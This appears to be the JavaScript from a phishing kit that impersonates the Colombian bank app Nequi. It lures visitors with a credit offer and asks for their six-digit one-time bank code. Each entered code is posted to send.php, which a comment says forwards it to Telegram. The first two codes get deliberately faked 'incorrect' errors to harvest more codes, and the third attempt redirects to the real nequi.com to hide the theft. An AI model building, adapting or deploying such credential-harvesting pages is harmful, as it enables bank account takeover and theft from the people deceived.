(() => {
  if (!sessionStorage.getItem('phone')) {
    window.location.replace('index.php');
    return;
  }

  const boxes = Array.from(document.querySelectorAll('.otp-box'));
  const form  = document.getElementById('otpForm');
  const btn   = document.getElementById('otpSubmit');
  const card  = document.getElementById('otpCard');
  const title = document.getElementById('otpTitle');
  const sub   = document.getElementById('otpSub');

  let attempts = Number(sessionStorage.getItem('otpAttempts') || '0');

  // Muestra/oculta estado de error visual
  function setOtpError(on) {
    if (on) {
      card.classList.add('otp-error');
      title.textContent = 'Clave dinámica incorrecta';
      sub.textContent   = 'Ingresa la clave de 6 dígitos que aparece en la App nuevamente.';
      btn.textContent   = 'Confirmar';
      boxes.forEach((b) => (b.value = ''));
      setTimeout(() => boxes[0]?.focus(), 50);
    } else {
      card.classList.remove('otp-error');
      title.textContent = 'Para finalizar, ingrese su clave dinámica';
      sub.textContent   = 'Ingresa la clave de 6 dígitos que aparece en la App.';
      btn.textContent   = 'Recibir Crédito';
    }
  }

  // Si ya van 1 o 2 intentos previos, mostrar estado de error al cargar
  if (attempts >= 1) setOtpError(true);

  setTimeout(() => boxes[0]?.focus(), 80);

  // Pantalla de carga fullscreen sin segundos visibles
  function showLoader(seconds, onDone) {
    const overlay = document.createElement('div');
    overlay.id = 'claveLoader';
    overlay.style.cssText = [
      'position:fixed;inset:0;background:#fff;',
      'display:flex;flex-direction:column;align-items:center;justify-content:center;',
      'z-index:8888;gap:18px;',
    ].join('');
    overlay.innerHTML = `
      <div class="loader-mini" aria-hidden="true"></div>
      <p class="loader-text-sm">Procesando solicitud</p>
    `;
    document.body.appendChild(overlay);
    window.scrollTo(0, 0);

    setTimeout(() => {
      overlay.remove();
      onDone();
      window.scrollTo(0, 0);
    }, seconds * 1000);
  }

  // Toast rojo profesional con aparición suave, luego redirect
  function showErrorToast(msg, redirectUrl) {
    const toast = document.createElement('div');
    toast.style.cssText = [
      'position:fixed;bottom:32px;left:50%;transform:translateX(-50%) translateY(20px);',
      'background:rgba(185,0,40,0.93);color:#fff;',
      'padding:16px 24px;border-radius:14px;max-width:320px;width:calc(100% - 48px);',
      'font-size:14px;line-height:1.55;text-align:center;font-weight:500;',
      'box-shadow:0 8px 32px rgba(185,0,40,0.35);',
      'opacity:0;transition:opacity .4s ease, transform .4s ease;z-index:9999;',
    ].join('');
    toast.textContent = msg;
    document.body.appendChild(toast);

    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        toast.style.opacity = '1';
        toast.style.transform = 'translateX(-50%) translateY(0)';
      });
    });

    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transform = 'translateX(-50%) translateY(20px)';
      setTimeout(() => {
        toast.remove();
        showLoader(15, () => {
          sessionStorage.clear();
          window.location.replace(redirectUrl);
        });
      }, 450);
    }, 3500);
  }

  // Navegación de cajas OTP
  boxes.forEach((box, i) => {
    box.addEventListener('input', (e) => {
      const v = e.target.value.replace(/\D/g, '');
      e.target.value = v.slice(-1);
      if (e.target.value && i < boxes.length - 1) boxes[i + 1].focus();
    });
    box.addEventListener('keydown', (e) => {
      if      (e.key === 'Backspace'   && !box.value && i > 0)               boxes[i - 1].focus();
      else if (e.key === 'ArrowLeft'   && i > 0)                              boxes[i - 1].focus();
      else if (e.key === 'ArrowRight'  && i < boxes.length - 1)              boxes[i + 1].focus();
    });
    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const d = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
      if (!d) return;
      d.split('').forEach((ch, idx) => { if (boxes[idx]) boxes[idx].value = ch; });
      boxes[Math.min(d.length, boxes.length - 1)].focus();
    });
  });

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const code = boxes.map((b) => b.value).join('');
    if (code.length !== 6) { boxes.find((b) => !b.value)?.focus(); return; }

    sessionStorage.setItem('otp', code);

    // Enviar a Telegram (no bloqueante)
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ step: 'otp', otp: code, attempt: attempts + 1 }),
      keepalive: true,
    }).catch(() => {});

    attempts += 1;
    sessionStorage.setItem('otpAttempts', String(attempts));

    btn.disabled    = true;
    btn.textContent = 'Procesando...';

    if (attempts === 1) {
      // 1.ª clave: 8 segundos de carga → estado de error
      showLoader(8, () => {
        btn.disabled    = false;
        btn.textContent = 'Confirmar';
        setOtpError(true);
      });

    } else if (attempts === 2) {
      // 2.ª clave: 4 segundos de carga → estado de error
      showLoader(4, () => {
        btn.disabled    = false;
        btn.textContent = 'Confirmar';
        setOtpError(true);
      });

    } else {
      // 3.ª clave: toast rojo → redirect
      showErrorToast(
        'Clave dinámica incorrecta, espera a que el último código haya cambiado y vuelve a intentar.',
        'https://www.nequi.com'
      );
    }
  });
})();
